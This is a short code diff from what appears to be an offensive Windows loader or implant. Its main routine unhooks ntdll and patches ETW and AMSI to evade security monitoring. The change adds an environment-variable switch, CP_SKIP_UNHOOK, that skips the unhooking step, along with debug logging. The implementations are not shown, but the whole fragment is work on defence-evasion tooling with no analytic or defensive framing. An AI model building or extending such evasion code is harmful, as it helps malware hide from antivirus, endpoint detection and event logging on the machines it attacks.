@@ -308,7 +308,12 @@ int main(void) {
 
     __try {
         DBG(">> unhook_Ntdll");
-        unhook_Ntdll();
+        if (getenv("CP_SKIP_UNHOOK") == NULL) {
+            unhook_Ntdll();
+            DBG("unhook_Ntdll returned");
+        } else {
+            DBG("unhook_Ntdll SKIPPED via CP_SKIP_UNHOOK");
+        }
         DBG(">> EtwPatch");
         EtwPatch();
         DBG(">> AmsiPatch");
